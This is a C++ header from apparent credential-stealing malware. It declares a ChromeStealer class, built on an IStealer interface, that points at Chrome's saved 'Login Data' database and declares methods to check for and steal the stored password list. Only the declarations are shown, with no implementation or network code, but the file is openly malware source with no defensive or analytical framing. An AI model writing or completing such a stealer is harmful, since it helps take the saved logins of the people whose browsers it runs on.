#pragma once

#include <boost\filesystem.hpp>

#include "IStealer.h"

#define CHROME_FILE "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

class ChromeStealer : public IStealer 
{
public:
	ChromeStealer(void);
	~ChromeStealer(void);

	virtual const bool canSteal(void) const;
	virtual const std::string stealPasswordList(void) const;

private:
	boost::filesystem::path _loginDatabasePath;
	std::string _appdataPath;
};

